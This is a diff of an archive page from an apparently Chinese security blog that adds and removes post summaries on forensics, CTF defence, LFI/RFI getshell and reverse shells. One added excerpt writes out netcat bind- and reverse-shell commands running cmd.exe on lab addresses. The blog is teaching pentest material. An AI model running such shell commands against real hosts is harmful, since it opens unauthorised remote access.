@@ -346,13 +346,121 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/09/05/%E6%B5%85%E8%B0%88%E7%94%B5%E5%AD%90%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF/" >
+            
+                <span>浅谈电子数字取证技术</span>
+        </a>
+        <div class="abstract-content">
+            0x00 前言近几年来，电子数字取证技术在网络攻击窃密、反欺诈调查、内部审计、失泄密痕迹发现、恶意网站查处等案件中发挥着举足轻重的作用。随着计算机犯罪及网络失泄密案件的频繁发生，电子数字证据作为一种新的证据形式势必越来越多的出现在司法活动中。
+0x01 取证概述韦氏大学词典（Dictionary by Merriam-Webster）
+取证（Forensic）是科学知识在法律问题中的应用，或，对物证的科学分析。取证属于、用于或适用于法院法庭或公开讨论和辩论。
+美国司法学会（National Institute of Justice, NIJ）
+定义电子数据是以二进制形式存储或传输的信息，...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/05</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "电子取证">电子取证</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/" >
+            
+                <span>Linux 反弹 Shell</span>
+        </a>
+        <div class="abstract-content">
+            攻击场景Attacker：192.168.0.106 win10
+Victim：192.168.2.140 kali
+NC 反弹 shellNetcat简介俗称瑞士军刀或NC，小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接地或容易地驱动。
+同时，nc又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。渗透测试中，linux主机一般自带nc，Windows主机需要自行上传。
+姿势一如果目标主机（受害机）支持“-e”选项的话，我们就可以直接进行利用。
+ps：为什么我们要在受害机的s...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/03/Windows%20%E5%8F%8D%E5%BC%B9%20Shell/" >
+            
+                <span>Windows 反弹 Shell</span>
+        </a>
+        <div class="abstract-content">
+            NC 反弹 shell攻击场景：
+12　　Victim IP：  192.168.2.10　　Attacker IP：192.168.2.11
+
+正向 Shell我们想要弹回Victim的Shell，使用如下命令：
+Victim：nc -lvp 9999 -e cmd.exe
+Attacker：nc 192.168.2.10 9999 
+ps：先在肉鸡上开一个cmd服务，然后在攻击机上进行连接
+反向 ShellAttacker：nc -vlp 9999
+Victim：nc 192.168.2.11 9999 -e cmd.exe
+ps：先在攻击机上进行监听，然后在肉鸡上给Attacker...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/03</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "木马后门">木马后门</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PowerShell">PowerShell</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/08/03/AWD%E6%94%BB%E9%98%B2%E8%B5%9B%E4%B9%8B%E5%90%84%E7%B1%BB%E6%BC%8F%E6%B4%9EFIX%E6%96%B9%E6%A1%88/" >
             
                 <span>AWD攻防赛之各类漏洞FIX方案</span>
         </a>
         <div class="abstract-content">
-            一、Background0x01 Introduction1、CTF中的线下赛又被称为AWD（Attack With Defence）。AWD对于选手的攻击能力，防御能力以及团队合作能力都有着很高的考验。比赛中有多支队伍，每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍的服务器可以进行得分，修补漏洞可以避免被其他队伍攻击失分。
-2、WEB安全中常见漏洞包括SQL注入、反序列化、文件上传、文件包含、代码执行、XXE、XXS、CSRF等。大家熟知的AWD攻防赛中常常是把某几个漏洞点结合起来进行考察。在AWD赛制中，攻与防是相对的，针对服务器上不同漏洞所采用的修补方案也不一样...
+            Background0x01 Introduction1、CTF中的线下赛又被称为AWD（Attack With Defence）。AWD对于选手的攻击能力，防御能力以及团队合作能力都有着很高的考验。比赛中有多支队伍，每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍的服务器可以进行得分，修补漏洞可以避免被其他队伍攻击失分。
+2、WEB安全中常见漏洞包括SQL注入、反序列化、文件上传、文件包含、代码执行、XXE、XXS、CSRF等。大家熟知的AWD攻防赛中常常是把某几个漏洞点结合起来进行考察。在AWD赛制中，攻与防是相对的，针对服务器上不同漏洞所采用的修补方案也不一样。
+...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -569,9 +677,9 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
             
             <div class= abstract-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "RFI">RFI</a>
-    
         <a class="post-tag" href="javascript:void(0);" data-tags = "Bypass">Bypass</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "RFI">RFI</a>
     
 </div>
             
@@ -629,117 +737,10 @@ RFI 限制在PHP配置文件中，allow_url_include包装器默认设置为“�
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/12/Linux-DNS-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/" >
-            
-                <span>Linux DNS 服务器配置与管理</span>
-        </a>
-        <div class="abstract-content">
-            一、环境介绍：
-　　运行软件：VMware Workstation Pro 14
-　　系统环境：CentOS-7-x86_64-1810
-二、操作配置：
-1、基础知识简介
-（1）域名空间
-
-域和域名：
-DNS树的每个节点代表一个域，通过这些节点，对整个域名空间进行划分，成为一个层次结构。域名空间的每个域的名字通过域名进行表示。域名通常由一个完全正式域名（FQDN）标识。
-Internet域名空间：
-DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共有3种类型的顶级域 (组织域、地址域、反向域)。
-区（Zone）：
-区是DNS名称空间的一个连续部分，其包含了一组存储在DN...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux">Linux</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/26/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95-Des/" >
-            
-                <span>Symmetric Key Encryption DES</span>
-        </a>
-        <div class="abstract-content">
-            对称加密 (Symmetric Key Encryption)对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。自1977年美国颁布DES（Data Encryption Standard）密码算法作为美国数据加密标准以来，对称密码体制迅速发展，得到了世界各国的关注和普遍应用。对称密码体制从工作方式上可以分为分组加密和序列密码两大类。
-对称加密算法的优点：算法公开、计算量小、加密速度快、加密效率高。
-对称加密算法的缺点：交...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "DES">DES</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/03/26/CBC%E5%AD%97%E8%8A%82%E5%8F%8D%E8%BD%AC%E6%94%BB%E5%87%BB/" >
-            
-                <span>针对 CBC 字节反转攻击的研究与漏洞复现</span>
-        </a>
-        <div class="abstract-content">
-            CBC 简介现代密码体制现代密码中的加密体制一般分为对称加密体制(Symmetric Key Encryption)和非对称加密体制(Asymmetric Key Encryption)。对称加密又分为分组加密和序列密码。
-分组密码
-分组密码：也叫块加密(block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组，有 ECB、CBC、CFB、OFB 四种工作模式。
-序列密码
-序列密码：也叫流加密(stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CBC">CBC</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "密码研究">密码研究</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/page/2/">&amp;#60; PREV</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/archives/page/4/">4</a><a class="page-number" href="/archives/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/7/">7</a><a class="extend next" rel="next" href="/archives/page/4/">NEXT &amp;#62;</a>
+        <a class="extend prev" rel="prev" href="/archives/page/2/">&amp;#60; PREV</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/archives/page/4/">4</a><a class="page-number" href="/archives/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/8/">8</a><a class="extend next" rel="next" href="/archives/page/4/">NEXT &amp;#62;</a>
     </nav>
     
 </main>
@@ -1852,9 +1853,66 @@ DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 69
+        Total : 72
         </div>
         <!-- search  -->
         
@@ -1870,7 +1928,22 @@ DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/" >LFI Bypass Session Base64Encode Getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/LFI-Bypass-sessionstart-getshell/" >LFI Bypass session_start() Getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E4%B9%8BLinux%E4%B8%8B%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/" >电子取证之Linux下文件恢复</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/RFI%E5%B7%A7%E7%94%A8WebDAV%E7%BB%95%E8%BF%87URL%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6Getshell/" >RFI巧用WebDAV绕过URL包含限制Getshell</a>
         </li>
     
     
@@ -1885,7 +1958,7 @@ DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2020/01/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%97%85%E8%A1%8C%E8%AE%B0/" >信息收集-旅行记</a>
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2020/01/18/Information-Collection-Handbook/" >Information Collection Handbook</a>
         </li>
     
     
@@ -2218,12 +2291,12 @@ DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/Vim%E7%BB%88%E7%AB%AF%E5%88%A9%E5%99%A8/" >Vim(Vi) 终端利器</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/Vim%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B1%8F/" >Vim 实现分屏</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/Vim%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B1%8F/" >Vim 实现分屏</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2018/01/25/Vim%E7%BB%88%E7%AB%AF%E5%88%A9%E5%99%A8/" >Vim(Vi) 终端利器</a>
         </li>
     
     
@@ -2258,39 +2331,41 @@ DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共
     
         <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
     
+        <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
         <span class="sidebar-tag-name" data-tags="CMS"><span class="iconfont-archer">&#xe606;</span>CMS</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
-        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
-    
-        <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="MacOS"><span class="iconfont-archer">&#xe606;</span>MacOS</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
-        <span class="sidebar-tag-name" data-tags="MATLAB"><span class="iconfont-archer">&#xe606;</span>MATLAB</span>
-    
-        <span class="sidebar-tag-name" data-tags="木马后门"><span class="iconfont-archer">&#xe606;</span>木马后门</span>
-    
-        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
-    
-        <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
-    
-        <span class="sidebar-tag-name" data-tags="SQLInjection"><span class="iconfont-archer">&#xe606;</span>SQLInjection</span>
-    
-        <span class="sidebar-tag-name" data-tags="RFI"><span class="iconfont-archer">&#xe606;</span>RFI</span>
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
     
         <span class="sidebar-tag-name" data-tags="Bypass"><span class="iconfont-archer">&#xe606;</span>Bypass</span>
     
-        <span class="sidebar-tag-name" data-tags="PowerShell"><span class="iconfont-archer">&#xe606;</span>PowerShell</span>
+        <span class="sidebar-tag-name" data-tags="木马后门"><span class="iconfont-archer">&#xe606;</span>木马后门</span>
+    
+        <span class="sidebar-tag-name" data-tags="MATLAB"><span class="iconfont-archer">&#xe606;</span>MATLAB</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="RFI"><span class="iconfont-archer">&#xe606;</span>RFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLInjection"><span class="iconfont-archer">&#xe606;</span>SQLInjection</span>
+    
+        <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
-        <span class="sidebar-tag-name" data-tags="MSF"><span class="iconfont-archer">&#xe606;</span>MSF</span>
+        <span class="sidebar-tag-name" data-tags="PowerShell"><span class="iconfont-archer">&#xe606;</span>PowerShell</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+        <span class="sidebar-tag-name" data-tags="MSF"><span class="iconfont-archer">&#xe606;</span>MSF</span>
     
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
     
@@ -2310,9 +2385,9 @@ DNS根域下面是顶级域，也由Internet域名注册授权机构管理。共
     
         <span class="sidebar-tag-name" data-tags="电子取证"><span class="iconfont-archer">&#xe606;</span>电子取证</span>
     
-        <span class="sidebar-tag-name" data-tags="HTTP"><span class="iconfont-archer">&#xe606;</span>HTTP</span>
-    
         <span class="sidebar-tag-name" data-tags="路由协议"><span class="iconfont-archer">&#xe606;</span>路由协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="HTTP"><span class="iconfont-archer">&#xe606;</span>HTTP</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -2359,11 +2434,11 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
-        <span class="sidebar-category-name" data-categories="漏洞挖掘"><span class="iconfont-archer">&#xe60a;</span>漏洞挖掘</span>
+        <span class="sidebar-category-name" data-categories="算法艺术"><span class="iconfont-archer">&#xe60a;</span>算法艺术</span>
     
         <span class="sidebar-category-name" data-categories="运维"><span class="iconfont-archer">&#xe60a;</span>运维</span>
     
-        <span class="sidebar-category-name" data-categories="算法艺术"><span class="iconfont-archer">&#xe60a;</span>算法艺术</span>
+        <span class="sidebar-category-name" data-categories="漏洞挖掘"><span class="iconfont-archer">&#xe60a;</span>漏洞挖掘</span>
     
         <span class="sidebar-category-name" data-categories="Hackintosh"><span class="iconfont-archer">&#xe60a;</span>Hackintosh</span>
     
